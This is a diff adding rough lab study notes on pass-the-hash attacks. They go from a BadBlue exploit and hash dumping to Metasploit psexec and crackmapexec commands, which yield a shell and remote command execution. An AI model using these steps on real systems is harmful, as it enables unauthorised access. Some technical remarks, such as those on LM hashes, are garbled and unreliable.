@@ -1,1 +1,33 @@
+Pass-the-hash is an exploitation technique that involves harvesting NTLM hashes or cleat-text passwords
+
+we can use multiple tools to facilitate a pass-The-Hash attack:
+Metasploit PsExec module
+Crackmapexec
+
+exploiting the badblue + kiwi (dumping hashes) then pass the hash attacks
+
+take the
+Administrator:NTLMhash
+Student:NTLM hash
+if you type hashdump we will get 
+Username:sid:Lm hash:NTLM hash //LM hash is same for everyone
+we need the lm hash
+
+search exploit/windows/smb/psexec
+use 
+set Rhosts
+set Rport // because the above is using one port so we have to give another port
+set smbuser administrator
+set smbpass lm:NTLM hash
+set target Native\ upload 
+exploit
+boom we get meterpreter session
+
+now with 
+crackmapexec smb <ip> -u Administrator -H "<ntlm>hash alone"
+boom the system is pw3d!
+after that
+crackmapexec smb <ip> -u Administrator -H "<ntlm>hash alone" -x "ipconfig"
+
+
 
